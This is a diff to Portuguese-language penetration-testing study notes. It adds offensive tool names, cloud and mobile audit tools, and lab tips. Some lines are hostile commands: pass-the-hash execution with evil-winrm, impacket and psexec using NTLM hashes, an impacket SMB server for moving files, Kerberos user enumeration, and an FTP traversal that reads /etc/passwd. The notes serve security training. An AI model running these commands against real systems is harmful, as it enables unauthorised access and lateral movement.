@@ -6322,6 +6322,9 @@ Checklist:
 
 	pth-winexe
 	psexec from metasploit
+	evil-winrm -i 127.0.0.1 -u user -H hashe-here
+	impacket-atexec -hashes 'hash-here' user@127.0.0.1 command(optionally)
+	impacket-wmiexec -hashes 'hashe-here' user@127.0.0.1
 	python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded user1@192.168.1.20
 	python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
 	python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
@@ -6985,6 +6988,17 @@ Outros padrões e frameworks de PenTest `NIST OSSTMM ISSAF PTES MITRE`
 
 `Acordo do nivel de serviço` Mensuração do serviço definida e remediação ou penalidades devem ser acordadas. Service Level Agreement - SLA
 
+Estágios de uma vulnerabilidade registrada: Discover -> Coordinate -> mitigate -> Manage -> Document
+
+- Ferramentas e Softwares online
+
+
+Soluções DAST: OwaspZap, Niktop, Wapiti
+
+WiGLE = Ferramenta que busca redes abertas e informações dos WiFI [WiGle](https://wigle.net)
+
+[HORUSEC](https://horusec.io/site/) Ferramenta de SAST que busca falhas de segurança enqanto está desenvolvendo, integrado a IDE, PipeLine. SNYK também é uma ferramenta com o mesmo proposito.
+
 `SEtoolkit` É uma ferramenta de Engenharia social que auxilia na utilização das técnicas
 
 `zphisher` Ferramenta de phising e engenharia social.
@@ -6993,7 +7007,25 @@ Outros padrões e frameworks de PenTest `NIST OSSTMM ISSAF PTES MITRE`
 
 Ferramentas de scan de vulnerabilidades WEB: `Arachni - Skipfish - Grabber - Wapiti - ZAP - Metasplois`
 
-Estágios de uma vulnerabilidade registrada: Discover -> Coordinate -> mitigate -> Manage -> Document
+Ferramenta para compartilhar aquivos na rede de forma fácil `impacket-smbserver -smb2support pentest -username user -password pass`
+
+Cloud Federation é a combinação de infraestrutura, serviços de plataform e softwares que podem aumentar o risco de ataque
+
+Auditar a nuvem: ferramentas que auxiliam nesse processo: `ScoutSuite` Open source, `Prowler` somente AWS, `Pacu` para AWS, `Cloud custodian` auxilia na criaação de políticas
+
+Ferramenta para ataque de wifi automatizado `Kismet`
+
+Ataques BlueTooth: `Bluejacking` ferramenta usada para enviar mensagens indesejadas, videos usando o bluetooth. `Bluesnarfing` Ataque mais perigoso que pode roubar informaçoes do dispositivo vai bluetooth
+
+`Ettercap` Ferramena que pode ser utilizada para ataques de Man in The middle e em aplicativos mobile. `Android SDK tools` ferramenta para análise de aplicativos mobile
+
+Ferramenta online para análise de aplicativos `mobsf.live`
+
+Ferramenta online de análise de malware `cuckoosandbox.org`
+
+Ferramentas de examinar códigos `Frida`,`Objection` análises avançadas de dispositivos, aplicativos e códigos e identifica root do android e JailBreak do iOS
+
+`netdiscover` ferramenta de descoberta de ativos na rede
 
 - PRATICA Anotação do [Thiago Muniz](/pentest+notes-prof)
 
@@ -7056,11 +7088,9 @@ Capabilities são funções especiais para arquivos, usuários, kernel etc. COmo
 
 O primeiro lista as capabilities que existem no sistema, o segundo executa o python pois estava listado no capabilities, troca o UID do usuário para 0 (que é o root) e drop a shell.
 
-[HORUSEC](https://horusec.io/site/) Ferramenta de SAST que busca falhas de segurança enqanto está desenvolvendo, integrado a IDE, PipeLine. SNYK também é uma ferramenta com o mesmo proposito.
+Script nmap que anumera usuários do Active Directory AD `krb5-enum-users` na porta 88 `sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='mtia.local' 192.168.200.100`
 
-Soluções DAST: OwaspZap, Niktop, Wapiti
-
-WiGLE = Ferramenta que busca redes abertas e informações dos WiFI [WiGle](https://wigle.net)
+- Teorias
 
 Spoofing é o ato de falsificar algo
 
@@ -7069,7 +7099,9 @@ RFI - O Arquivo pode ser acessado atravez de um paramentro em uma maquina remota
 
 NOTA: Em um dos laboratórios com a descoberta de portas e serviços, havia um serviço RPC... e na numeração do NMAP havia uma pista no scripts do NMAP, `rpc.py` ao pesqisarmos por exploit, existe um exploit que explora a vulnerabilidade. No segundo lab 201 encontramos um serviço de FTP aberto e com a versão 2.8, ao procurar por exploits na internt encontramos um que ao escutar com `nc -vnlp 1258` e depois interagindo com o FTP com TELNET executa `PORT 127,0,0,1,1,1002` depois `RETR ../../../../../../../etc/passwd`
 
-Script nmap que anumera usuários do Active Directory AD `krb5-enum-users` na porta 88 `sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='mtia.local' 192.168.200.100`
+Moving between VLANS - Pra mover entre VLANs é preciso realizar um ataque MACOF que causa um overflow na tabela MAC em um switch vulnerável
+
+On-Path Attach é o mesmo que Man in The Middle na literatura da EcCouncil
 
 .
 .
